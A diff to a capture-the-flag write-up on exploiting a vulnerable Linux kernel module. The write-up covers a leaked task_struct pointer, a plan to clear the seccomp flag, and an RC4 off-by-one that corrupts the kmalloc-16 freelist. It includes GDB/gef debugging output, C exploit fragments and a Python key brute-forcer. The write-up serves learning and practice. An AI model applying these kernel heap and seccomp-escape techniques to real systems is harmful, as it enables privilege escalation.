@@ -106,6 +106,8 @@ qemu-system-x86_64 \
     -s
 ```
 
+**We set the parameter `-s` to create a gdbserver that we will connect to later to debug the kernel.**
+
 As soon as we run our vm and execute our exploit we get an error:
 
 ```console
@@ -235,7 +237,7 @@ The value of each parameter is defined at the top of the file
 
 ### Spotting the vulnerability
 
-There is a big leak in `KEBAB_IOCTL_SET_KEY`, they provide us with ``current`` pointer. At the moment, we execute `/chall/run` as root because of SUID perms, but we cannot open the flag because of SECCOMP rules. There is a flag called `_TIF_SECCOMP`, that is on if SECCOMP is enabled, if we could zero out this flag somehow we could disable SECCOMP and read the flag or even spawn a shell. This flag is stored at `current->thread_info.flags`, which happens to be the first 8 bytes of the `task_struct`. So having now our leak, if we zero out the address we are given, we will break out of the restricted environment.
+There is a big leak in `KEBAB_IOCTL_SET_KEY`, they provide us with ``current`` pointer. At the moment, we execute `/chall/run` as root because of SUID perms, but we cannot open the flag because of SECCOMP rules. There is a flag called `_TIF_SECCOMP`, that is on if SECCOMP is enabled, if we could zero out this flag somehow we could disable SECCOMP and read the flag or even spawn a shell. This flag is stored at `current->thread_info.flags`, which happens to be the first 8 bytes of the `task_struct`. So having now our leak, if we zero out the address we are given, we will break out of the restricted environment. Source [task_struct definition](https://elixir.bootlin.com/linux/v6.18.3/source/include/linux/sched.h#L819), and [thread_info](https://elixir.bootlin.com/linux/v6.18.3/source/arch/arc/include/asm/thread_info.h#L38).
 
 The global `RC4_key` variable is defined at the top of the file along with the other structures: `static char RC4_key[MAX_RC4_LEN + 1] = {0};` it is sized `MAX_RC4_LEN + 1`!
 The encrypting function that does the heavy lifting is `rc4_crypt`:
@@ -269,7 +271,7 @@ Now we will debug the module to see how is this affecting to the kernel heap. Bu
 
 ```c
 
-static char key_buf[MAX_RC4_LEN] = {0};
+static char key_buf[MAX_RC4_LEN] = {0x41};
 static char leak_buf[MAX_RC4_LEN] = {0};
 static key_info leak = {0};
 
@@ -317,4 +319,104 @@ set_key();
 unsigned long current = (unsigned long)leak.cur;
 logleak("task_struct current", current);
 logleak("PID", (unsigned long)leak.pid);
+```
+
+And then we create a new 16 byte secure buffer by sending a bunch of A's.
+
+```c
+char A[0x10] = "AAAAAAAAAAAAAAAA";
+create_buf(sizeof(A), A);
+```
+
+For the debugging im using [gef](https://github.com/bata24/gef) plugin for GDB, it has useful kernel debugging utilities.
+We can use the command `vmlinux-to-elf` to generate an ELF binary with symbols from the kernel image, this binary is what we will use to debug with GDB, `vmlinux-to-elf vmlinuz-4.19.306 vmlinux`.  
+We run the VM and connect with GDB `gdb vmlinux` and once we are in, `target remote :1234`. Don't forget to disable KASLR in `run.sh` file, this can be done changing the ``kaslr`` keyword to `nokaslr`. This way we can debug easily with only 1 import of the symbols. After connecting to the remote instance we can check the kernel base address with `kbase` and set up the symbols with ``add-symbol-file vmlinux kbase``. Using vmmap we check the base address of the module
+
+```c
+0xffffffffc0002000-0xffffffffc0003000 0x0000000000001000 [r-x] modules, kernel module (kebab)
+0xffffffffc0003000-0xffffffffc0004000 0x0000000000001000 [r--] modules, kernel module (kebab)
+0xffffffffc0004000-0xffffffffc0006000 0x0000000000002000 [rw-] modules, kernel module (kebab)
+```
+
+We can add the module symbols the same way `add-symbol-file initramfs/chall/kebab_mod.ko 0xffffffffc0002000`. We will place 2 breakpoints, in the kmalloc we are interested in (the one used to store the encrypted data), and one after the encryption to see how it got filled.
+
+![alt text](kmalloc.png)
+
+Now with a single ``stepover`` we can check `$rax` to see the pointer to the new chunk. We placed a breakpoint at the end of `rc4_crypt` to look at the chunk.
+This is **before** the encryption:
+
+```c
+gef> x/4gx $rax
+0xffff88803db71930:	0x0000000000000000	0x0000000000000000
+0xffff88803db71940:	0xffff88803db71950	0x0000000000000000 <-- The pointer 0xffff88803db71950 is the next free chunk in the freelist 
+```
+
+**After** `rc4_crypt`
+
+```c
+gef> x/4gx 0xffff88803db71930
+0xffff88803db71930:	0xe08ce2817ca78a83	0x6a74b1a51d28eafb
+0xffff88803db71940:	0xffff88803db71977	0x0000000000000000
+```
+
+The next pointer's last byte got modified to 0x77.
+
+The kernel heap has caches por each size of allocations, for example an allocation of 1000 bytes would be in `kmalloc-1k` cache, one of 30 bytes to `kmalloc-32`, etc. In this case we are allocating objects of size 16 so our object ends up in kmalloc-16, we can easily verify this with gef's command `slab-contains 0xffff88803db71930`
+
+```c
+gef> slab-contains 0xffff88803db71930
+[+] Wait for memory scan
+page: 0xffffea0000f6dc40
+kmem_cache: 0xffff88803e001a80
+base: 0xffff88803db71000
+name: kmalloc-16  size: 0x10  num_pages: 0x1
+```
+
+In this kernel version, the chunks are ordered and are allocated sequentially one after the other:
+
+```c
+gef> slub-dump kmalloc-16
+
+...
+0x091 0xffff88803db71910 (in-use)
+0x092 0xffff88803db71920 (in-use)
+0x093 0xffff88803db71930 (in-use)
+0x094 0xffff88803db71940 (next: 0xffff88803db71950)
+0x095 0xffff88803db71950 (next: 0xffff88803db71960)
+0x096 0xffff88803db71960 (next: 0xffff88803db71970)
+...
+
+```
+
+Each free chunk has the address of the next chunk to be allocated. If we somehow tamper this next pointer to point to itself, we can create a loop where we allocate on top of this next pointer, and we can change it with anything we want. In this case, we could change it to the address of `current`!
+Our data chunk is always falling into ``0xffff88803db71930``, and we have an off-by-one into `0xffff88803db71940`'s next pointer, if we manage to find a key that when the 16th byte is 0, the result of the encryption is 0x40 we will successfully create a loop.
+
+Cryptography is definitely not my field, so I had some trouble understanding how it worked. But RC4 is not a secure algorithm, and it can be easily reversed. So if we get an output from `enc(key, message)`, if we now `enc(cipher, message)` we will get the key back. So knowing this I created a [python script](assets/rc4.py) that bruteforces this problem:
+
+```python
+from Crypto.Cipher import ARC4
+from pwn import *
+
+def brute(b: int):
+    for i in range(0xfff):
+        key = p16(i) 
+        length = 1
+        cipher = ARC4.new(key)
+        buf = b'A' * 16 + b'\x00'
+        msg = cipher.encrypt(buf)
+        if msg[16] == b:
+            c_arr = ", ".join([f"0x{b:02x}" for b in key])
+            print("static char key_buf[MAX_RC4_LEN] = {", c_arr, " };")
+
+brute(0x40)
+
+```
+
+This produced the key 0x35, but for some reason I still don't know, it does not work, so I chose the next key 0x1dd.
+
+```console
+lkt@pwn:~/Desktop/ctf/kerbab/kerbab$ python3 rc4.py 
+static char key_buf[MAX_RC4_LEN] = { 0x35, 0x00  };
+static char key_buf[MAX_RC4_LEN] = { 0xdd, 0x01  };
+...
 ```
